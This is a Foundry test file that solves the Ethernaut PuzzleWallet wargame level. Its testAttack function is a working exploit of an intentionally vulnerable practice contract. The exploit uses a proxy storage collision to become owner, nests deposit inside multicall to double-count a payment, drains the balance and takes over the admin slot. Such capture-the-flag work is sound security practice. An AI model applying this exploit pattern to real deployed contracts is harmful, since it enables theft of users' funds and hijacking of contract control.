// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_24/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet walletLogic;
    PuzzleProxy proxy;
    PuzzleWallet walletInstance;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
        vm.deal(alice, 1 ether);
        walletLogic = new PuzzleWallet();

        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);
        proxy = new PuzzleProxy(address(this), address(walletLogic), data);
        walletInstance = PuzzleWallet(address(proxy));

        walletInstance.addToWhitelist(address(this));
        walletInstance.deposit{value: 0.001 ether}();
    }

    function testAttack() public {
        // proxy.pendingAdmin();
        // proxy.admin();
        // walletInstance.owner();
        // walletInstance.maxBalance();

        // walletInstance.deposit{value: 1 wei}();

        vm.startPrank(alice);
        proxy.proposeNewAdmin(alice);
        walletInstance.addToWhitelist(alice);
        walletInstance.addToWhitelist(address(walletInstance));

        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
        walletInstance.multicall{value: 0.001 ether}(calls);

        walletInstance.execute(alice, 0.002 ether, "");
        walletInstance.setMaxBalance(uint256(uint160(alice)));

        assertEq(proxy.admin(), alice);
    }
}
